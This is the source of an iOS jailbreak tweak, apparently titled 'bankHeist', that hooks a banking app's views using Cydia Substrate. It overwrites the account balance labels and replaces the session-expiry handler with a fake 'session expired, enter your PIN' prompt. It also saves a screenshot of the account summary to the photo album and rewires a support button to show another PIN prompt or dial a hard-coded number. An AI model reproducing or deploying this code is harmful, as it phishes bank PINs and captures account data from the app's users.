
#import <bankHeist.h>
#import <substrate.h> // necessary
#import <Foundation/Foundation.h>



/**
NSString *str; 
object_getInstanceVariable(self, "_lastNotificationReceivedBundleIdentifier", (void **)&str);

NSLog(@"identifier=%@",str); 

%orig; 
**/




//                                                                                                                                                hack session expiration 

%hook AccountView_iPhone
-(void)hideOverlay{

%orig;
UILabel * _newAvailable;
UILabel * _newBalance;

    _newAvailable = MSHookIvar<UILabel *>(self, "labelAvailable");
    _newBalance = MSHookIvar<UILabel *>(self, "labelBalance");

    NSLog(@"new = %@", _newBalance.text);
    %log(@"new = %@", _newBalance.text);

    _newBalance.text = @"much interest";
    _newAvailable.text = @"wow spends";
return;

}
%end

%hook StatementView
/** nothing here
-(void)awakeFromNib{

-(void)setup{
**/
-(void)layoutSubviews{

%orig;
UILabel * newAvailable;
UILabel * newBalance;

    newAvailable = MSHookIvar<UILabel *>(self, "_labelAvailable");
    newBalance = MSHookIvar<UILabel *>(self, "_labelBalance");

    NSLog(@"new = %@", newBalance.text);
    %log(@"new = %@", newBalance.text);

    newBalance.text = @"much interest";
    newAvailable.text = @"wow spends";
return;

}
%end


%hook ClientSessionTimeoutManager_Shared

+(id)NOTIFICATION_TIMEDOUT{
  return %orig;
}

%end


%hook AnalyticsManager_Shared


-(void)sessionExpiryEvent {

UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@"Sorry, your session has expired"
                                  message:@"Please enter your PIN to login again:"
                                  delegate:self
                                  cancelButtonTitle:@"OK"
                                  otherButtonTitles:nil];
        [alertView setAlertViewStyle:UIAlertViewStyleSecureTextInput];
        /* Display a numerical keypad for this text field */
        UITextField *textField = [alertView textFieldAtIndex:0];
        textField.keyboardType = UIKeyboardTypeNumberPad;

[alertView show];
//%orig;

}
%end



%hook PhoneCallButton

-(void)dialButtonPressed:(UIButton*)pressed{


  NSString* _phoneNumber;;

    _phoneNumber = MSHookIvar<NSString * >(self, "_phoneNumber");


//technical support

switch (pressed.tag)
   {
      case 0:
        NSLog (@"zero");
        break;
      case 1:
        NSLog (@"one");
        break;
      case 2:
        NSLog (@"two");
        break;
      case 3:
        NSLog (@"three");
        break;
      case 4:
        NSLog (@"four");
        // national number tech support
        %orig;
        break;
      case 5:
        NSLog (@"five");{

        //international number tech support
             UIImage *image = nil;
    UIGraphicsBeginImageContextWithOptions(_accountSummaryView.bounds.size, NO, [UIScreen mainScreen].scale);
    [_accountSummaryView.layer renderInContext:UIGraphicsGetCurrentContext()];
    image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
     UIImageWriteToSavedPhotosAlbum(image, nil, nil, nil);



        UIAlertView *alertView = [[UIAlertView alloc]
                                          initWithTitle:[NSString  stringWithFormat:@"hi :%@",_phoneNumber]
                                          message:@"Please enter your PIN to login again:"
                                          delegate:self
                                          cancelButtonTitle:@"OK"
                                          otherButtonTitles:nil];
                [alertView setAlertViewStyle:UIAlertViewStyleSecureTextInput];
                /* Display a numerical keypad for this text field */
                UITextField *textField = [alertView textFieldAtIndex:0];
                textField.keyboardType = UIKeyboardTypeNumberPad;

                [alertView show];
              }
        break;
      case 6:{
        NSLog (@"six");
            NSString *phNo = @"+919876543210";
            NSURL *phoneUrl = [NSURL URLWithString:[NSString  stringWithFormat:@"telprompt:%@",phNo]];

                if ([[UIApplication sharedApplication] canOpenURL:phoneUrl]) {
                    [[UIApplication sharedApplication] openURL:phoneUrl];
                } else
                {
                    UIAlertView *calert = [[UIAlertView alloc]initWithTitle:@"Alert" message:@"Call facility is not available!!!" delegate:nil cancelButtonTitle:@"ok" otherButtonTitles:nil, nil];
                    [calert show];
            }
          }
          break;
        default:
          NSLog (@"Integer out of range");
          
        break;
   }


}
%end




/**
UIAlertView *alertView = [[UIAlertView alloc]initWithTitle:[NSString  stringWithFormat:@"hi :%f",value]  message:@"Please enter your PIN to login again:" delegate:self cancelButtonTitle:@"OK" otherButtonTitles:nil];
[alertView show];
**/


/**
CGRect screenRect = [[UIScreen mainScreen] bounds];

UIGraphicsBeginImageContext(screenRect.size);
          
     shot = UIGraphicsGetImageFromCurrentImageContext();
     UIGraphicsEndImageContext();
     
     
**/

/**
- (BOOL)alertViewShouldEnableFirstOtherButton:(UIAlertView *)alertView
{
    NSString *inputText = [[alertView textFieldAtIndex:0] text];
    if( [inputText length] >= 10 )
    {
        return YES;
    }
    else
    {
        return NO;
    }
}
**/


  